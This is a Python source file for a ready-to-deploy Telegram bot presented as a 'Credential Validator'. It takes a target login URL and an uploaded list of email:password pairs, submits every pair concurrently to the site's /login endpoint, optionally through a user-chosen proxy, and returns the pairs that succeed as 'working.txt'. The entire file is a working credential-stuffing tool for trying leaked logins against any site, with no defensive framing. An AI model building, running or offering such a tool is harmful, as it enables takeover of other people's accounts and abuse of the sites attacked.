#!/usr/bin/env python3
"""
Credential Validator Bot
Railway-ready | python-telegram-bot v20+
"""

import os
import asyncio
import logging
from io import BytesIO
from typing import List, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin

import aiohttp
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ================= CONFIG =================

TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
MAX_CONCURRENT = int(os.getenv("MAX_CONCURRENT", "20"))
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "20"))

if not TELEGRAM_TOKEN:
    raise RuntimeError("TELEGRAM_BOT_TOKEN not set")

# ================= LOGGING =================

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ================= DATA =================

@dataclass
class Credential:
    email: str
    password: str
    original: str

# ================= BOT =================

class CredentialValidatorBot:
    def __init__(self):
        self.timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        self.session: Optional[aiohttp.ClientSession] = None
        self.user_states = {}
        self.cancel_flags = {}

    # ---------- /start ----------
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        msg = (
            "⚡ *Credential Validator Bot*\n\n"
            "*Workflow:*\n"
            "1️⃣ Send login URL\n"
            "2️⃣ Upload TXT file\n"
            "3️⃣ Get working creds\n\n"
            "Optional:\n"
            "`/proxy http://user:pass@ip:port`\n\n"
            "Use /cancel anytime"
        )

        keyboard = [[InlineKeyboardButton("🚀 Start", callback_data="begin")]]
        await update.message.reply_text(
            msg,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )

        self.user_states[update.effective_user.id] = {"step": "waiting_url"}

    # ---------- /proxy ----------
    async def set_proxy(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id

        if not context.args:
            await update.message.reply_text(
                "Usage:\n`/proxy http://user:pass@ip:port`",
                parse_mode="Markdown",
            )
            return

        proxy = context.args[0]
        parsed = urlparse(proxy)

        if parsed.scheme not in ("http", "https", "socks5"):
            await update.message.reply_text("❌ Invalid proxy format")
            return

        self.user_states.setdefault(user_id, {})["proxy"] = proxy
        await update.message.reply_text("✅ Proxy set for this session")

    # ---------- /cancel ----------
    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self.cancel_flags[user_id] = True
        await update.message.reply_text("🛑 Cancelled")

    # ---------- Button ----------
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        q = update.callback_query
        await q.answer()

        if q.data == "begin":
            await q.edit_message_text(
                "🔗 Send login URL:\n`https://site.com/login`",
                parse_mode="Markdown",
            )

    # ---------- Messages ----------
    async def message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        text = update.message.text
        doc = update.message.document

        if user_id not in self.user_states:
            await update.message.reply_text("Use /start first")
            return

        state = self.user_states[user_id]

        # URL step
        if state.get("step") == "waiting_url" and text:
            if not self._valid_url(text):
                await update.message.reply_text("❌ Invalid URL")
                return

            state["url"] = text.strip()
            state["step"] = "waiting_file"
            await update.message.reply_text("📁 Upload TXT file")
            return

        # File step
        if state.get("step") == "waiting_file" and doc:
            if not doc.file_name.endswith(".txt"):
                await update.message.reply_text("❌ TXT files only")
                return

            await self._process_file(update, context, doc)

    # ---------- Core ----------
    def _valid_url(self, url: str) -> bool:
        try:
            p = urlparse(url)
            return p.scheme in ("http", "https") and p.netloc
        except Exception:
            return False

    async def _process_file(self, update, context, doc):
        user_id = update.effective_user.id
        state = self.user_states[user_id]

        msg = await update.message.reply_text("📥 Processing...")

        file = await context.bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        creds = self._parse_creds(content.decode(errors="ignore"))

        if not creds:
            await msg.edit_text("❌ No valid credentials")
            return

        self.cancel_flags[user_id] = False
        await msg.edit_text(f"🚀 Validating {len(creds):,} creds")

        asyncio.create_task(self._run_validation(context, user_id, creds, state))

    def _parse_creds(self, text: str) -> List[Credential]:
        out = []
        for line in text.splitlines():
            if ":" in line:
                e, p = line.split(":", 1)
                if "@" in e and len(p) > 3:
                    out.append(Credential(e, p, line))
        return out

    async def _run_validation(self, context, user_id, creds, state):
        proxy = state.get("proxy")
        connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=self.timeout,
        ) as session:
            sem = asyncio.Semaphore(MAX_CONCURRENT)
            working = []

            async def check(cred):
                async with sem:
                    if self.cancel_flags.get(user_id):
                        return False
                    return await self._attempt(session, state["url"], cred, proxy)

            results = await asyncio.gather(*(check(c) for c in creds))
            for c, ok in zip(creds, results):
                if ok:
                    working.append(c)

        await self._finish(context, user_id, working, state["url"])

    async def _attempt(self, session, base_url, cred, proxy):
        try:
            async with session.post(
                urljoin(base_url, "/login"),
                data={"email": cred.email, "password": cred.password},
                proxy=proxy,
            ) as r:
                return r.status == 200
        except Exception:
            return False

    async def _finish(self, context, user_id, working, url):
        if not working:
            await context.bot.send_message(user_id, "❌ No working creds")
        else:
            buf = BytesIO("\n".join(c.original for c in working).encode())
            buf.seek(0)
            await context.bot.send_document(
                user_id,
                buf,
                filename="working.txt",
                caption=f"✅ {len(working)} working\n🌐 {url}",
            )

        self.user_states.pop(user_id, None)
        self.cancel_flags.pop(user_id, None)

# ================= MAIN =================

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    bot = CredentialValidatorBot()

    app.add_handler(CommandHandler("start", bot.start))
    app.add_handler(CommandHandler("proxy", bot.set_proxy))
    app.add_handler(CommandHandler("cancel", bot.cancel))
    app.add_handler(CallbackQueryHandler(bot.button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.message_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, bot.message_handler))

    logger.info("Bot started")
    app.run_polling()

if __name__ == "__main__":
    main()
